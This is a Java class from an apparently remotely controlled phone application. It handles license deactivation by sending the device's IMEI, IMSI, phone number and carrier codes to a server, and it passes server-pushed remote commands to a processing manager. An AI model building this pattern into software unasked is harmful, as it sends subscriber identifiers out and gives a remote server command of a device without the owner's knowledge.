package com.vvt.protmgr;

import java.util.Vector;
import com.vvt.global.Global;
import com.vvt.info.ApplicationInfo;
import com.vvt.info.ServerUrl;
import com.vvt.license.LicenseInfo;
import com.vvt.license.LicenseManager;
import com.vvt.license.LicenseStatus;
import com.vvt.prot.CommandListener;
import com.vvt.prot.CommandMetaData;
import com.vvt.prot.CommandRequest;
import com.vvt.prot.CommandServiceManager;
import com.vvt.prot.command.CompressionType;
import com.vvt.prot.command.EncryptionType;
import com.vvt.prot.command.Languages;
import com.vvt.prot.command.SendDeactivate;
import com.vvt.prot.command.TransportDirectives;
import com.vvt.prot.response.CmdResponse;
import com.vvt.prot.response.struct.SendDeactivateCmdResponse;
import com.vvt.rmtcmd.RmtCmdProcessingManager;
import com.vvt.std.Constant;
import com.vvt.std.FxTimer;
import com.vvt.std.FxTimerListener;
import com.vvt.std.Log;
import com.vvt.std.PhoneInfo;

public class SendDeactivateManager implements CommandListener, FxTimerListener {
	
	private static final int DEACTIVATION_INTERVAL = 60 * 1;
	private static SendDeactivateManager self = null;
	private LicenseManager license = Global.getLicenseManager();
	private CommandServiceManager comServMgr = Global.getCommandServiceManager();
	private RmtCmdProcessingManager rmtCmdMgr = Global.getRmtCmdProcessingManager();
	private ServerUrl serverUrl = Global.getServerUrl();
	private LicenseInfo licenseInfo = license.getLicenseInfo();
	private Vector listeners = new Vector();
	private SendDeactivateCmdResponse sendDeactCmdRes = null;
	private FxTimer deactivateTimer = new FxTimer(this);
	private boolean progress = false;
	
	private SendDeactivateManager() {
		deactivateTimer.setInterval(DEACTIVATION_INTERVAL);
	}
	
	public static SendDeactivateManager getInstance() {
		if (self == null) {
			self = new SendDeactivateManager();
		}
		return self;
	}
	
	public void deactivate() {
		licenseInfo = license.getLicenseInfo();
		if (licenseInfo.getLicenseStatus().getId() == LicenseStatus.ACTIVATED.getId()) {
			if (!progress) {
				progress = true;
				try {
					CommandRequest cmdRequest = new CommandRequest();
					// Meta Data
					CommandMetaData cmdMetaData = new CommandMetaData();
					cmdMetaData.setProtocolVersion(ApplicationInfo.PROTOCOL_VERSION);
					cmdMetaData.setProductId(licenseInfo.getProductID());
					cmdMetaData.setProductVersion(ApplicationInfo.PRODUCT_VERSION);
					cmdMetaData.setConfId(licenseInfo.getProductConfID());
					cmdMetaData.setDeviceId(PhoneInfo.getIMEI());
					cmdMetaData.setLanguage(Languages.THAI);
					cmdMetaData.setPhoneNumber(PhoneInfo.getOwnNumber());
					cmdMetaData.setMcc(Constant.EMPTY_STRING + PhoneInfo.getMCC());
					cmdMetaData.setMnc(Constant.EMPTY_STRING + PhoneInfo.getMNC());
					cmdMetaData.setActivationCode(licenseInfo.getActivationCode());
					cmdMetaData.setImsi(PhoneInfo.getIMSI());
					cmdMetaData.setTransportDirective(TransportDirectives.RESUMABLE);
					cmdMetaData.setEncryptionCode(EncryptionType.ENCRYPT_ALL_METADATA.getId());
					cmdMetaData.setCompressionCode(CompressionType.NO_COMPRESS.getId());
					// Deactivation Data
					SendDeactivate deactData = new SendDeactivate();
			    	cmdRequest.setCommandData(deactData);
			    	cmdRequest.setCommandMetaData(cmdMetaData);	
			    	cmdRequest.setUrl(serverUrl.getServerActivationUrl());
			    	cmdRequest.setCommandListener(this);
			    	// Execute Command
					comServMgr.execute(cmdRequest);
					deactivateTimer.stop();
					deactivateTimer.start();
				} catch(Exception e) {
					Log.error("SendDeactivateManager.doSend", null, e);
					progress = false;
					notifyError(e.getMessage());
				}
			}
		}
	}
	
	public void addListener(PhoenixProtocolListener listener) {
		if (!isExisted(listener)) {
			listeners.addElement(listener);
		}
	}

	public void removeListener(PhoenixProtocolListener listener) {
		if (isExisted(listener)) {
			listeners.removeElement(listener);
		}
	}
	
	private boolean isExisted(PhoenixProtocolListener listener) {
		boolean existed = false;
		for (int i = 0; i < listeners.size(); i++) {
			if (listener == listeners.elementAt(i)) {
				existed = true;
				break;
			}
		}
		return existed;
	}
	
	private void notifySuccess() {
		for (int i = 0; i < listeners.size(); i++) {
			PhoenixProtocolListener listener = (PhoenixProtocolListener)listeners.elementAt(i);
			listener.onSuccess(sendDeactCmdRes);
		}
	}
	
	private void notifyError(String message) {
		for (int i = 0; i < listeners.size(); i++) {
			PhoenixProtocolListener listener = (PhoenixProtocolListener)listeners.elementAt(i);
			listener.onError(message);
		}
	}

	// CommandListener
	public void onSuccess(CmdResponse response) {
		if (response instanceof SendDeactivateCmdResponse) {
			deactivateTimer.stop();
			progress = false;
			sendDeactCmdRes = (SendDeactivateCmdResponse)response;
			int statusCode = sendDeactCmdRes.getStatusCode();
			if (statusCode == 0) {
				licenseInfo.setLicenseStatus(LicenseStatus.DEACTIVATED);
				license.commit(licenseInfo);
				// To process PCC commands.
				rmtCmdMgr.process(sendDeactCmdRes.getPCCCommands());
				notifySuccess();
			} else {
				notifyError(sendDeactCmdRes.getServerMsg());
			}
		}
	}
	
	public void onConstructError(long csid, Exception e) {
		Log.error("SendDeactivateManager.onError", "csid: " + csid, e);
		deactivateTimer.stop();
		progress = false;
		notifyError(e.getMessage());
	}
	
	public void onTransportError(long csid, Exception e) {
		Log.error("SendDeactivateManager.onError", "csid: " + csid, e);
		deactivateTimer.stop();
		progress = false;
		String errMsg = "Unable to connect to server.";
		notifyError(errMsg);
	}

	// FxTimerListener
	public void timerExpired(int id) {
		// TODO To cancel deactivation command.
		progress = false;
		String msg = "Time out!";
		notifyError(msg);
	}
}
